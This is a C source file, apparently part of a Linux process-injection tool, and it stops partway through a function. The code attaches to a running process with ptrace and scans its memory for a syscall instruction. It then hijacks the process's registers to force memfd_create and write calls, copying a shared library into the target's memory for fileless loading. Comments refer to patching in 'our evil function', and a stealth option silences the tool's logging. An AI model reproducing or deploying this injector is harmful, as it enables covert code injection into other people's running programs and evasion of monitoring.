#define _LARGEFILE64_SOURCE
#include <ctype.h>
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/select.h>
#include <signal.h>
#include <time.h>
#include <unistd.h>
#include "ae_log.h"

// im sorry for making this project nobody wants 2k lines of C code please forgive me baby

typedef unsigned char bool;
typedef unsigned long ulong_t;
typedef unsigned char uchar_t;

#define false 0;
#define true  1;

#define MAXBUF 256
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

#define SINGLESTEP_TIMEOUT_SEC 5
#define WAITPID_TIMEOUT_SEC 10
#define MAX_SINGLESTEP_ITERATIONS 20

/* Architecture-specific syscall numbers */
#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
#ifndef SYS_memfd_create
#define SYS_memfd_create 319
#endif
#ifndef SYS_mmap
#define SYS_mmap 9
#endif
#ifndef SYS_open
#define SYS_open 2
#endif
#else /* 32-bit */
#ifndef SYS_memfd_create
#define SYS_memfd_create 356
#endif
#endif

#ifndef MFD_CLOEXEC
#define MFD_CLOEXEC 0x0001U
#endif

/* ELF relocation type for x86-64 */
#ifndef R_X86_64_JUMP_SLOT
#define R_X86_64_JUMP_SLOT 7
#endif

struct ae_sym {
	int count;
	char name[MAXBUF];
	int index;
	uintptr_t offset;  /* Use pointer-sized offset for 32/64-bit compatibility */
};

struct ae_sym_info {
	int count;
	struct ae_sym syms[0];
};

/* options for the program */
struct ae_opts {
	bool stealth;
	int pid;
	char * func;
	char * libname;
};

typedef enum ae_seg_type {
	TYPE_TEXT = 0,
	TYPE_DATA = 1,
} ae_seg_type_t;

struct ae_segment {
	ulong_t base;
	ulong_t offset;
	ulong_t len;
}; 

struct ae_segments {
	struct ae_segment segs[2];
};
	

static ulong_t ae_original;
static ulong_t ae_text_base;
static ulong_t ae_text_base_original;
static ulong_t ae_data_base;
static bool ae_stealth_mode = false;

static int ae_is_address_mapped(int pid, ulong_t addr, size_t size);
static int ae_ensure_stopped(int pid);
static ulong_t ae_find_sysenter(int pid, ulong_t start, ulong_t end, size_t max_search_size, size_t chunk_size);
static void ae_show_progress_bar(ulong_t current, ulong_t total, const char * status, int done);
static inline void ae_ptrace_cpy_from(ulong_t * dst, ulong_t src, size_t size, int pid);
static inline void ae_ptrace_cpy_to(ulong_t dst, ulong_t * src, size_t size, int pid);
static int ae_waitpid_with_timeout(pid_t pid, int *status, int timeout_sec, const char *context);
static int ae_singlestep_with_timeout(int pid, int max_iterations, int timeout_sec, const char *context, uintptr_t syscall_number, uintptr_t *result);

// wait for process to stop with timeout so we dont hang forever
// i have no fucking idea why this fixed it but it did
static int ae_waitpid_with_timeout(pid_t pid, int *status, int timeout_sec, const char *context) {
    struct timeval start_time, current_time;
    gettimeofday(&start_time, NULL);
    
    if (!ae_stealth_mode && context)
        ae_log(AE_LOG_DEBUG, "[TIMEOUT] Waiting for PID %d (%s), timeout: %d sec", pid, context, timeout_sec);
    
    while (1) {
        pid_t result = waitpid(pid, status, WNOHANG);
        
        if (result == pid) {
            if (!ae_stealth_mode)
                ae_log(AE_LOG_DEBUG, "[TIMEOUT] waitpid succeeded for PID %d", pid);
            return result;
        }
        
        if (result == -1 && errno != ECHILD) {
            ae_log(AE_LOG_ERROR, "[TIMEOUT] waitpid failed for PID %d: %s", pid, strerror(errno));
            return -1;
        }
        
        gettimeofday(&current_time, NULL);
        double elapsed = (current_time.tv_sec - start_time.tv_sec) + 
                        (current_time.tv_usec - start_time.tv_usec) / 1000000.0;
        
        if (elapsed >= timeout_sec) {
            ae_log(AE_LOG_ERROR, "[TIMEOUT] waitpid timeout after %.2f seconds for PID %d (%s)", 
                   elapsed, pid, context ? context : "unknown");
            return 0;
        }
        
        usleep(10000);
    }
}

/* single steps through syscalls to detect when they complete by watching register changes */
static int ae_singlestep_with_timeout(int pid, int max_iterations, int timeout_sec,
                                      const char *context, uintptr_t syscall_number, uintptr_t *result) {
    struct timeval start_time, current_time;
    gettimeofday(&start_time, NULL);
    int step_status;
    struct user_regs_struct reg;
    int iteration = 0;
    int syscall_started = 0;

    if (!ae_stealth_mode)
        ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Starting single-step for %s (syscall: %lu, max_iterations: %d, timeout: %d sec)",
               context ? context : "unknown", (unsigned long)syscall_number, max_iterations, timeout_sec);

    for (iteration = 0; iteration < max_iterations; iteration++) {
        /* check timeout before each iteration */
        gettimeofday(&current_time, NULL);
        double elapsed = (current_time.tv_sec - start_time.tv_sec) +
                        (current_time.tv_usec - start_time.tv_usec) / 1000000.0;

        if (elapsed >= timeout_sec) {
            ae_log(AE_LOG_ERROR, "[SINGLESTEP] Timeout after %.2f seconds at iteration %d (%s)",
                   elapsed, iteration, context ? context : "unknown");
            return -1;
        }

        if (ptrace(PTRACE_SINGLESTEP, pid, NULL, NULL) == -1) {
            ae_log(AE_LOG_ERROR, "[SINGLESTEP] PTRACE_SINGLESTEP failed at iteration %d: %s",
                   iteration, strerror(errno));
            return -1;
        }

        /* wait for singlestep with timeout */
        pid_t wait_result = ae_waitpid_with_timeout(pid, &step_status, timeout_sec,
                                                     context ? context : "single-step");

        if (wait_result == 0) {
            ae_log(AE_LOG_ERROR, "[SINGLESTEP] waitpid timeout at iteration %d", iteration);
            return -1;
        }

        if (wait_result == -1) {
            ae_log(AE_LOG_ERROR, "[SINGLESTEP] waitpid failed at iteration %d: %s",
                   iteration, strerror(errno));
            return -1;
        }

        if (wait_result != pid) {
            ae_log(AE_LOG_ERROR, "[SINGLESTEP] waitpid returned unexpected PID: %d (expected: %d)",
                   wait_result, pid);
            return -1;
        }

        /* validate process status */
        if (WIFEXITED(step_status)) {
            ae_log(AE_LOG_ERROR, "[SINGLESTEP] Process exited during iteration %d (exit status: %d)",
                   iteration, WEXITSTATUS(step_status));
            return -1;
        }

        if (WIFSIGNALED(step_status)) {
            ae_log(AE_LOG_ERROR, "[SINGLESTEP] Process killed during iteration %d (signal: %d)",
                   iteration, WTERMSIG(step_status));
            return -1;
        }

        if (!WIFSTOPPED(step_status)) {
            ae_log(AE_LOG_ERROR, "[SINGLESTEP] Unexpected wait status 0x%x at iteration %d (not stopped)",
                   step_status, iteration);
            return -1;
        }

        if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
            ae_log(AE_LOG_ERROR, "[SINGLESTEP] Failed to get registers at iteration %d: %s",
                   iteration, strerror(errno));
            return -1;
        }

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
        /* 64-bit: detect when syscall starts (rax has syscall num) and when it finishes */
        if (!syscall_started) {
            if ((uintptr_t)reg.rax == syscall_number) {
                syscall_started = 1;
                if (!ae_stealth_mode)
                    ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Syscall %lu started at iteration %d (RIP: 0x%lx)",
                           (unsigned long)syscall_number, iteration, (unsigned long)reg.rip);
            }
        } else {
            /* 64-bit: don't use the 32-bit kernel address check; just check if rax changed */
            if ((uintptr_t)reg.rax != syscall_number) {
                *result = (uintptr_t)reg.rax;
                if (!ae_stealth_mode)
                    ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Syscall %lu completed at iteration %d: result=0x%lx (RIP: 0x%lx)",
                           (unsigned long)syscall_number, iteration, (unsigned long)*result, (unsigned long)reg.rip);
                return 0;
            }
        }

        if (!ae_stealth_mode && (iteration % 5 == 0 || iteration < 3))
            ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Iteration %d: RAX=0x%lx, RIP=0x%lx",
                   iteration, (unsigned long)reg.rax, (unsigned long)reg.rip);
#else
        /* 32-bit: detect when syscall starts (eax has syscall num) and when it finishes (back in userspace with result) */
        if (!syscall_started) {
            if ((unsigned int)reg.eax == syscall_number) {
                syscall_started = 1;
                if (!ae_stealth_mode)
                    ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Syscall %u started at iteration %d (EIP: 0x%lx)",
                           (unsigned int)syscall_number, iteration, (unsigned long)reg.eip);
            }
        } else {
            /* kernel addrs are high (0xf7xxxxxx) user addrs are lower, check if we are back in userspace */
            int in_kernel = (reg.eip & 0xff000000) == 0xf7000000;

            if (!in_kernel && (unsigned int)reg.eax != syscall_number) {
                *result = (uintptr_t)reg.eax;
                if (!ae_stealth_mode)
                    ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Syscall %u completed at iteration %d: result=0x%x (EIP: 0x%lx)",
                           (unsigned int)syscall_number, iteration, (unsigned int)*result, (unsigned long)reg.eip);
                return 0;
            }
        }

        if (!ae_stealth_mode && (iteration % 5 == 0 || iteration < 3))
            ae_log(AE_LOG_DEBUG, "[SINGLESTEP] Iteration %d: EAX=0x%lx, EIP=0x%lx",
                   iteration, (unsigned long)reg.eax, (unsigned long)reg.eip);
#endif
    }

    ae_log(AE_LOG_ERROR, "[SINGLESTEP] Syscall %lu did not complete within %d iterations", (unsigned long)syscall_number, max_iterations);
    return -1;
}

// code works logic questionable but hey bro it works vibes are high
// checks if an address is actually mapped in the target process by reading /proc/pid/maps
static int ae_is_address_mapped(int pid, ulong_t addr, size_t size) {
    char maps_path[64];
    snprintf(maps_path, sizeof(maps_path), "/proc/%d/maps", pid);
    FILE *f = fopen(maps_path, "r");
    if (!f)
        return 0;
    char line[256];
    ulong_t start, end;
    int mapped = 0;
    while (fgets(line, sizeof(line), f)) {
        if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
            if (addr >= start && (addr + size) <= end) {
                mapped = 1;
                break;
            }
        }
    }
    fclose(f);
    return mapped;
}

// make sure process is stopped before we fuck with it
static int ae_ensure_stopped(int pid) {
    int status;
    if (waitpid(pid, &status, WNOHANG) > 0 && WIFSTOPPED(status))
        return 0;
    
    // check /proc/pid/stat to see if already stopped (state T or t)
    char stat_path[64];
    char stat_line[512];
    FILE *stat_file;
    snprintf(stat_path, sizeof(stat_path), "/proc/%d/stat", pid);
    stat_file = fopen(stat_path, "r");
    if (stat_file) {
        if (fgets(stat_line, sizeof(stat_line), stat_file)) {
            char *state = strchr(stat_line, ')');
            if (state && (state[2] == 'T' || state[2] == 't')) {
                fclose(stat_file);
                return 0;
            }
        }
        fclose(stat_file);
    }
    
    if (kill(pid, SIGSTOP) == -1)
        return -1;
    if (waitpid(pid, &status, WUNTRACED) == -1)
        return -1;
    if (!WIFSTOPPED(status))
        return -1;
    return 0;
}
// look at this clean code just look at it its beautiful
// draws a progress bar on stderr if its a tty shows how much we searched
static void
ae_show_progress_bar (ulong_t current,
		      ulong_t total,
		      const char * status,
		      int done)
{
	static int use_tty = -1;

	if (ae_stealth_mode)
		return;

	if (use_tty == -1)
		use_tty = isatty(fileno(stderr));
	if (!use_tty)
		return;

	if (total == 0)
		total = 1;
	if (current > total)
		current = total;

	unsigned long percent = (current * 100UL) / total;
	const int bar_width = 40;
	int filled = (int)((percent * bar_width) / 100UL);

	fprintf(stderr, "\r\033[K[");
	for (int i = 0; i < bar_width; i++) {
		if (i < filled)
			fputc('=', stderr);
		else if (i == filled)
			fputc('>', stderr);
		else
			fputc(' ', stderr);
	}
	fprintf(stderr, "] %3lu%% %s", percent, status ? status : "");
	if (done)
		fputc('\n', stderr);
	fflush(stderr);
}

static inline void ae_ptrace_cpy_to(ulong_t dst, ulong_t * src, size_t size, int pid);

/* byte signatures for finding our evil function and the transfer code pattern
 * autogenerated by makefile - include the appropriate header based on architecture */
#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
#include "ae_signatures_64.h"
#else
#include "ae_signatures.h"
#endif


// its not pretty but it gets the job done fuck it
// opens /lib/libname reads the whole file into memory and returns it
static uchar_t *
ae_read_library_file (char * libname, size_t * lib_size)
{
	char libpath[MAXBUF];
	int fd;
	struct stat64 st;
	uchar_t * buf = NULL;
	ssize_t bytes_read;

	snprintf(libpath, MAXBUF, "/lib/%s", libname);

	fd = open(libpath, O_RDONLY);
	if (fd == -1) {
		ae_log(AE_LOG_ERROR, "Could not open library file: %s", libpath);
		return NULL;
	}

	if (fstat64(fd, &st) < 0) {
		ae_log(AE_LOG_ERROR, "Could not stat library file");
		close(fd);
		return NULL;
	}

	*lib_size = st.st_size;
	buf = (uchar_t *)malloc(st.st_size);
	if (!buf) {
		ae_log(AE_LOG_ERROR, "Could not allocate buffer for library");
		close(fd);
		return NULL;
	}

	bytes_read = read(fd, buf, st.st_size);
	if (bytes_read != st.st_size) {
		ae_log(AE_LOG_ERROR, "Could not read complete library file");
		free(buf);
		close(fd);
		return NULL;
	}

	close(fd);
	ae_log(AE_LOG_DEBUG, "Read %zu bytes from %s", *lib_size, libpath);
	return buf;
}


/* YAY IT FUCKING WORKS
 * hijack target process to call memfd_create by setting registers and single stepping through syscall */
static int
ae_force_memfd_create (int pid, ulong_t sysenter, const char * name)
{
	struct user_regs_struct reg;
	int memfd = -1;
	ulong_t name_addr;
	char saved_data[MAXBUF];
	size_t name_len = strlen(name) + 1;

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Ensuring process %d is stopped before memfd_create", pid);
	if (ae_ensure_stopped(pid) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to ensure process is stopped: %s", strerror(errno));
		return -1;
	}
	
	if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to get registers: %s", strerror(errno));
		return -1;
	}

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	/* 64-bit: use rsp, simpler stack check since 64-bit user addresses vary widely */
	ulong_t stack_limit = 0x1000;
	ulong_t stack_ptr = reg.rsp;
	
	if (stack_ptr < stack_limit + name_len + 256) {
		ae_log(AE_LOG_ERROR, "Stack pointer too low: 0x%lx", stack_ptr);
		return -1;
	}
	
	name_addr = (stack_ptr & ~0x7) - (name_len + 64);  /* 8-byte aligned on 64-bit */
	
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Using stack address 0x%lx for memfd name (rsp: 0x%lx)", name_addr, stack_ptr);
#else
	/* 32-bit: use esp, 32-bit linux stack usually in upper addr space (0x80000000+) */
	ulong_t stack_limit = 0x1000;
	ulong_t stack_ptr = reg.esp;
	if (stack_ptr < 0x80000000) {
		stack_limit = 0x1000;
	} else {
		stack_limit = 0x40000000;
	}
	
	if (stack_ptr < stack_limit + name_len + 256) {
		ae_log(AE_LOG_ERROR, "Stack pointer too low: 0x%lx", stack_ptr);
		return -1;
	}
	
	name_addr = (stack_ptr & ~0x3) - (name_len + 64);
	
	if (name_addr < stack_limit) {
		ae_log(AE_LOG_ERROR, "Calculated stack address too low: 0x%lx (esp: 0x%lx, limit: 0x%lx)", 
		       name_addr, stack_ptr, stack_limit);
		return -1;
	}
	
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Using stack address 0x%lx for memfd name (esp: 0x%lx)", name_addr, stack_ptr);
#endif
	
	errno = 0;
	long test_read = ptrace(PTRACE_PEEKTEXT, pid, name_addr, NULL);
	if (test_read == -1 && errno) {
		ae_log(AE_LOG_ERROR, "Cannot read from stack address 0x%lx: %s", name_addr, strerror(errno));
#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
		name_addr = (stack_ptr & ~0x7) - 256;
#else
		name_addr = (stack_ptr & ~0x3) - 256;
#endif
		if (name_addr < stack_limit) {
			ae_log(AE_LOG_ERROR, "Alternative stack address also too low: 0x%lx", name_addr);
			return -1;
		}
		test_read = ptrace(PTRACE_PEEKDATA, pid, name_addr, NULL);
		if (test_read == -1 && errno) {
			ae_log(AE_LOG_ERROR, "Cannot read from alternative stack address 0x%lx: %s", name_addr, strerror(errno));
			return -1;
		}
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Using alternative stack address 0x%lx", name_addr);
	}
	
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Backing up stack area at 0x%lx (size: %zu)", name_addr, name_len + 16);
	ae_ptrace_cpy_from((ulong_t*)saved_data, name_addr, name_len + 16, pid);
	if (errno != 0 && errno != EIO) {
		ae_log(AE_LOG_ERROR, "Failed to backup stack area: %s", strerror(errno));
		return -1;
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Writing memfd name '%s' to 0x%lx (len: %zu)", name, name_addr, name_len);
	ae_ptrace_cpy_to(name_addr, (ulong_t*)name, name_len, pid);
	if (errno != 0) {
		ae_log(AE_LOG_ERROR, "Failed to write memfd name: %s", strerror(errno));
		return -1;
	}
	
	char verify_buf[MAXBUF] = {0};
	ae_ptrace_cpy_from((ulong_t*)verify_buf, name_addr, name_len, pid);
	if (strncmp(verify_buf, name, name_len) != 0) {
		ae_log(AE_LOG_ERROR, "Failed to verify memfd name write");
		ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);
		return -1;
	}
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Verified memfd name written successfully");

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	/* 64-bit: save rax, rdi, rsi, rdx, rip */
	unsigned long long orig_rax = reg.rax;
	unsigned long long orig_rdi = reg.rdi;
	unsigned long long orig_rsi = reg.rsi;
	unsigned long long orig_rdx = reg.rdx;
	unsigned long long orig_rip = reg.rip;

	/* 64-bit syscall convention: rax=num, rdi=name_addr, rsi=flags, rip=syscall_addr */
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Setting up memfd_create syscall: RAX=0x%x, RDI=0x%lx (name_addr), RSI=0x%x, RIP=0x%lx", 
		       SYS_memfd_create, name_addr, MFD_CLOEXEC, sysenter);
	reg.rax = SYS_memfd_create;
	reg.rdi = name_addr;
	reg.rsi = MFD_CLOEXEC;
	reg.rip = sysenter;
#else
	/* 32-bit: save eax, ebx, ecx, edx, eip */
	long orig_eax = reg.eax;
	long orig_ebx = reg.ebx;
	long orig_ecx = reg.ecx;
	long orig_edx = reg.edx;
	long orig_eip = reg.eip;

	/* 32-bit syscall convention: eax=num, ebx=name_addr, ecx=flags, eip=sysenter */
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Setting up memfd_create syscall: EAX=0x%x, EBX=0x%lx (name_addr), ECX=0x%x, EIP=0x%lx", 
		       SYS_memfd_create, name_addr, MFD_CLOEXEC, sysenter);
	reg.eax = SYS_memfd_create;
	reg.ebx = name_addr;
	reg.ecx = MFD_CLOEXEC;
	reg.eip = sysenter;
#endif

	if (ptrace(PTRACE_SETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to set registers: %s", strerror(errno));
		ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);
		return -1;
	}
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Registers set successfully, ready to execute syscall");

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Executing memfd_create syscall via single-step (syscall_addr: 0x%lx)", sysenter);
	
	uintptr_t memfd_result;
	int singlestep_result = ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
	                                                    SINGLESTEP_TIMEOUT_SEC,
	                                                    "memfd_create", SYS_memfd_create, &memfd_result);

	if (singlestep_result == -1) {
		ae_log(AE_LOG_ERROR, "Single-step failed for memfd_create");
		ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);
		return -1;
	}

	memfd = (int)memfd_result;
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "memfd_create syscall completed: result=0x%lx (memfd=%d)", (unsigned long)memfd_result, memfd);

	if (memfd < 0) {
		ae_log(AE_LOG_ERROR, "memfd_create failed: %d (errno: %s)", memfd, strerror(errno));
		char vbuf[MAXBUF] = {0};
		ae_ptrace_cpy_from((ulong_t*)vbuf, name_addr, name_len, pid);
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Name at 0x%lx contains: '%s'", name_addr, vbuf);
		ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);
		return -1;
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Created memfd: %d", memfd);

	ae_ptrace_cpy_to(name_addr, (ulong_t*)saved_data, name_len + 16, pid);

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	reg.rax = orig_rax;
	reg.rdi = orig_rdi;
	reg.rsi = orig_rsi;
	reg.rdx = orig_rdx;
	reg.rip = orig_rip;
#else
	reg.eax = orig_eax;
	reg.ebx = orig_ebx;
	reg.ecx = orig_ecx;
	reg.edx = orig_edx;
	reg.eip = orig_eip;
#endif
	ptrace(PTRACE_SETREGS, pid, NULL, &reg);

	return memfd;
}


/* future me is gonna hate present me for this shit
 * writes data to memfd by copying chunks to target memory then hijacking write syscall */
static int
ae_write_to_memfd (int pid, ulong_t sysenter, int memfd, uchar_t * data, size_t data_size)
{
	struct user_regs_struct reg;
	size_t offset = 0;
	size_t chunk_size;
	size_t write_buf_size = 4096;
	ssize_t written;

	ptrace(PTRACE_GETREGS, pid, NULL, &reg);

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	unsigned long long orig_rax = reg.rax;
	unsigned long long orig_rdi = reg.rdi;
	unsigned long long orig_rsi = reg.rsi;
	unsigned long long orig_rdx = reg.rdx;
	unsigned long long orig_rip = reg.rip;
#else
	long orig_eax = reg.eax;
	long orig_ebx = reg.ebx;
	long orig_ecx = reg.ecx;
	long orig_edx = reg.edx;
	long orig_eip = reg.eip;
#endif

	while (offset < data_size) {
		chunk_size = (data_size - offset > write_buf_size) ? write_buf_size : (data_size - offset);

		/* copy chunk to target process memory first */
		ae_ptrace_cpy_to(ae_data_base, (ulong_t*)(data + offset), chunk_size, pid);

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
		/* 64-bit syscall: write(fd, buf, count) → rdi, rsi, rdx */
		reg.rax = SYS_write;
		reg.rdi = memfd;
		reg.rsi = ae_data_base;
		reg.rdx = chunk_size;
		reg.rip = sysenter;
#else
		/* 32-bit syscall: write(fd, buf, count) → ebx, ecx, edx */
		reg.eax = SYS_write;
		reg.ebx = memfd;
		reg.ecx = ae_data_base;
		reg.edx = chunk_size;
		reg.eip = sysenter;
#endif

		ptrace(PTRACE_SETREGS, pid, NULL, &reg);

		written = -1;
		uintptr_t write_result;
		char context_buf[64];
		snprintf(context_buf, sizeof(context_buf), "write(memfd=%d, offset=%zu)", memfd, offset);

		if (ae_singlestep_with_timeout(pid, MAX_SINGLESTEP_ITERATIONS,
		                                  SINGLESTEP_TIMEOUT_SEC, context_buf, SYS_write, &write_result) == 0) {
			written = (ssize_t)write_result;
			if (!ae_stealth_mode)
				ae_log(AE_LOG_DEBUG, "write syscall completed: wrote %ld bytes", written);
		}

		if (written != (ssize_t)chunk_size) {
			ae_log(AE_LOG_ERROR, "write to memfd failed: wrote %ld of %zu bytes", written, chunk_size);
			return -1;
		}

		offset += chunk_size;
		if (!ae_stealth_mode)
			ae_log(AE_LOG_DEBUG, "Wrote %zu/%zu bytes to memfd", offset, data_size);
	}

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	reg.rax = orig_rax;
	reg.rdi = orig_rdi;
	reg.rsi = orig_rsi;
	reg.rdx = orig_rdx;
	reg.rip = orig_rip;
#else
	reg.eax = orig_eax;
	reg.ebx = orig_ebx;
	reg.ecx = orig_ecx;
	reg.edx = orig_edx;
	reg.eip = orig_eip;
#endif
	ptrace(PTRACE_SETREGS, pid, NULL, &reg);

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Successfully wrote %zu bytes to memfd %d", data_size, memfd);
	return 0;
}


// read memory from target process using ptrace word by word
// why the fuck did i make this shit
static inline void
ae_ptrace_cpy_from (ulong_t * dst,
			ulong_t src,
			size_t size,
			int pid)
{
	int i;
	long ret;

	for (i = 0; i < (size+sizeof(ulong_t)-1)/sizeof(ulong_t); i++) {
		errno = 0;
		ret = ptrace(PTRACE_PEEKTEXT, pid, src + i*sizeof(ulong_t));
		if (ret == -1 && errno) {
			if (errno != EIO) {
				ae_log(AE_LOG_ERROR, "Ptrace PEEKTEXT failed at 0x%lx (iteration %d/%zu): %s", 
				       src + i*sizeof(ulong_t), i, (size+sizeof(ulong_t)-1)/sizeof(ulong_t), strerror(errno));
			}
			errno = EIO;
			return;
		}
		dst[i] = ret;
	}
	errno = 0;
}

/* search memory for syscall instruction which we use to hijack syscalls
 * 64-bit: syscall (0x0f 0x05)
 * 32-bit: sysenter (0x0f 0x34) */
static ulong_t
ae_find_sysenter (int pid,
		  ulong_t start,
		  ulong_t end,
		  size_t max_search_size,
		  size_t chunk_size)
{
	unsigned char buf[4096];
	ulong_t found = 0;

	if (chunk_size < 2)
		chunk_size = 2;
	if (chunk_size > sizeof(buf))
		chunk_size = sizeof(buf);

	if (end <= start)
		return 0;

	ulong_t limit = start + max_search_size;
	if (limit > end || limit < start)
		limit = end;

	if (limit - start < 2)
		return 0;

	ulong_t total = limit - start;
	ulong_t bytes_searched = 0;

#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
	const char *progress_status = "Searching for syscall...";
	const uint8_t instr_byte2 = 0x05;  /* syscall = 0F 05 */
#else
	const char *progress_status = "Searching for sysenter...";
	const uint8_t instr_byte2 = 0x34;  /* sysenter = 0F 34 */
#endif

	if (!ae_stealth_mode)
		ae_show_progress_bar(0, total, progress_status, 0);

	for (ulong_t addr = start; addr < limit && !found; addr += chunk_size) {
		size_t remaining = (size_t)(limit - addr);
		size_t read_size = (remaining > chunk_size) ? chunk_size : remaining;
		if (read_size < 2)
			break;

		errno = 0;
		ae_ptrace_cpy_from((ulong_t*)buf, addr, read_size, pid);
		if (errno == 0) {
			bytes_searched += read_size;
			/* look for 0x0f 0x05 (syscall) or 0x0f 0x34 (sysenter) */
			for (size_t i = 0; i + 1 < read_size; i++) {
				if (buf[i] == 0x0f && buf[i + 1] == instr_byte2) {
					found = addr + i;
#if defined(__x86_64__) || (defined(__WORDSIZE) && __WORDSIZE == 64)
					/* 64-bit: return the syscall instruction address directly */
					if (!ae_stealth_mode) {
						ae_show_progress_bar(bytes_searched, total, "Syscall found!", 0);
						ae_show_progress_bar(total, total, "Syscall found!", 1);
					}
#else
					/* 32-bit: go back 5 bytes to get to start of syscall wrapper */
					if (found >= 5)
						found -= 5;
					if (!ae_stealth_mode) {
						ae_show_progress_bar(bytes_searched, total, "Sysenter found!", 0);
						ae_show_progress_bar(total, total, "Sysenter found!", 1);
					}
#endif
					break;
				}
			}
		} else {
			continue;
		}

		if (!ae_stealth_mode)
			ae_show_progress_bar(bytes_searched, total, progress_status, 0);
	}

	if (!found && !ae_stealth_mode)
		ae_show_progress_bar(bytes_searched, total, "Instruction not found", 1);

	return found;
}



// everything is broken and i am the reason why fuck me
// writes memory to target process one word at a time using POKETEXT
static inline void
ae_ptrace_cpy_to (ulong_t dst,
			ulong_t * src,
			size_t size,
			int pid)
{
	int i;
	for (i = 0; i < (size+sizeof(ulong_t)-1) / sizeof(ulong_t); i++) {
		errno = 0;
		long ret = ptrace(PTRACE_POKETEXT, pid, dst + (i*sizeof(ulong_t)), src[i]);
		if (ret == -1 && errno) {
			ae_log(AE_LOG_ERROR, "Ptrace POKEDATA failed at 0x%lx (iteration %d/%zu): %s", 
			       dst + (i*sizeof(ulong_t)), i, (size+sizeof(ulong_t)-1)/sizeof(ulong_t), strerror(errno));
			errno = 0;
			ret = ptrace(PTRACE_POKETEXT, pid, dst + (i*sizeof(ulong_t)), src[i]);
			if (ret == -1 && errno) {
				ae_log(AE_LOG_ERROR, "Ptrace POKETEXT fallback also failed: %s", strerror(errno));
				return;
			}
		}
	}
}


// patches the mov instruction in our evil function to point to the original function
static void
ae_inject_transfer_code (int pid, ulong_t target_addr, ulong_t newval)
{
	ae_log(AE_LOG_DEBUG, "Injecting %lx at 0x%lx", newval, target_addr);
	ptrace(PTRACE_POKETEXT, pid, target_addr, newval);
}


// ITS FUCKING ALIVEEEEE
// its alive ITS ALIVEEEEE
// reads library from disk creates memfd in target process writes library to memfd all in memory
static int
ae_phantom_load (int pid, char * libname, ulong_t sysenter, int * memfd_out)
{
	uchar_t * lib_data = NULL;
	size_t lib_size = 0;
	int memfd = -1;
	char memfd_name[MAXBUF];
	struct user_regs_struct reg;

	if (ae_ensure_stopped(pid) == -1) {
		ae_log(AE_LOG_ERROR, "Target not stopped before phantom_load");
		return -1;
	}
	if (ptrace(PTRACE_GETREGS, pid, NULL, &reg) == -1) {
		ae_log(AE_LOG_ERROR, "Failed to get registers in phantom_load: %s", strerror(errno));
		return -1;
	}

	// read library file into our memory first
	lib_data = ae_read_library_file(libname, &lib_size);
	if (!lib_data) {
		ae_log(AE_LOG_ERROR, "Failed to read library file");
		return -1;
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Loaded library %s (%zu bytes) into injector memory", libname, lib_size);

	// create memfd in target process with name "phantom_libname"
	snprintf(memfd_name, MAXBUF, "phantom_%s", libname);
	memfd = ae_force_memfd_create(pid, sysenter, memfd_name);
	if (memfd < 0) {
		ae_log(AE_LOG_ERROR, "Failed to create memfd in target process");
		free(lib_data);
		return -1;
	}

	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Created memfd %d in target process", memfd);

	// write the library data to the memfd we just created
	if (!ae_stealth_mode)
		ae_log(AE_LOG_DEBUG, "Writing %zu bytes to memfd %d", lib_size, memfd);
